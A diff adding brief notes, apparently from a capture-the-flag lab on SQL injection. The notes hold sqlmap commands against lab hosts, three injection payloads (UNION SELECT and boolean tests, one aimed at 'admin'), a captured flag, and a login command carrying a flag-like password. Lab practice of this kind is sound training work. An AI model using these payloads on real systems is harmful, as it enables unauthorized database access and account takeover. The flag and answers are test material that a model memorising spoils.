@@ -1,0 +1,11 @@
+python sqlmap.py -u "http://62.173.140.174:36114/search?q=student" --batch --banner
+
+payloads: 	1) student' UNION SELECT NULL,NULL,NULL--
+		2) student' AND 2724=2724-- TYaf
+		3) admin' AND 2724=2724-- TYaf
+
+
+FLAG{SQLMAP_LAB_BASIC_INJECTION}
+
+python sqlmap.py -u "http://62.173.140.174:36100/login" --data="username=admin&password=flag_codeby_1og25ka9psv4as"
+
